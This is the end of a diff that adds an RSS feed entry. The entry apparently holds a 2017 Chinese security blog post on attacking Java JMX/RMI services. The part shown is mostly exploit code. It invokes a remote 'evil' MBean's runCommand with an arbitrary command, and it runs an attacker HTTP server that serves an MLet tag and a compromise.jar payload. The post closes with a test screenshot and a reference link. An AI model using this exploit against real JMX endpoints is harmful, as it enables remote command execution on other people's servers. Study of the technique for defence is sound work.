+                &lt;span class=&quot;nc&quot;&gt;HashSet&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res_set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HashSet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;Iterator&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res_set&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+                &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nextObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nextObject&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nextObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+                &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;evil_bean&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ObjectInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nextObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+				&lt;span class=&quot;c1&quot;&gt;//调用恶意 MBean 中用于执行命令的函数&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Loaded class: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;evil_bean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; object &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;evil_bean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getObjectName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Calling runCommand with: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evil_bean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getObjectName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;runCommand&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()});&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Result: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;MLetHandler&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpHandler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpExchange&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        	&lt;span class=&quot;cm&quot;&gt;/**
+             * mlet 标签
+             * &amp;lt;MLET
+			 * CODE = class | OBJECT = serfile
+			 * ARCHIVE = &quot;archiveList&quot;
+			 * [CODEBASE = codebaseURL]
+			 * [NAME = mbeanname]
+			 * [VERSION = version]
+			 * &amp;gt;
+			 * [arglist]
+			 * &amp;lt;/MLET&amp;gt;
+             */&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;respone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;HTML&amp;gt;&amp;lt;mlet code=%s archive=%s name=%s&amp;gt;&amp;lt;/mlet&amp;gt;&amp;lt;/HTML&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;EVILCLASS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JARNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;OBJECTNAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Sending mlet: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;respone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendResponseHeaders&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;respone&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;OutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResponseBody&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;respone&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getBytes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JarHandler&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpHandler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpExchange&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Request made for JAR...&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;//这里的 compromise.jar 可以根据实际的路径来修改&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Users/k1n9/Workspace/Java/compromise.jar&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytearray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()];&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;FileInputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fis&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FileInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;BufferedInputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bis&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;BufferedInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;bis&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendResponseHeaders&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;nc&quot;&gt;OutputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getResponseBody&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;0x03-测试&quot;&gt;0x03 测试&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://ooo.0o0.ooo/2017/08/24/599e8c1f24520.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;https://www.optiv.com/blog/exploiting-jmx-rmi&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Thu, 24 Aug 2017 00:00:00 +0800</pubDate>
+        <link>http://localhost:4000/2017/08/24/attack-jmx-rmi.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2017/08/24/attack-jmx-rmi.html</guid>
+        
+        <category>Java</category>
+        
+        <category>JMX</category>
+        
+        
+      </item>
+    
+    </channel>
+</rss>
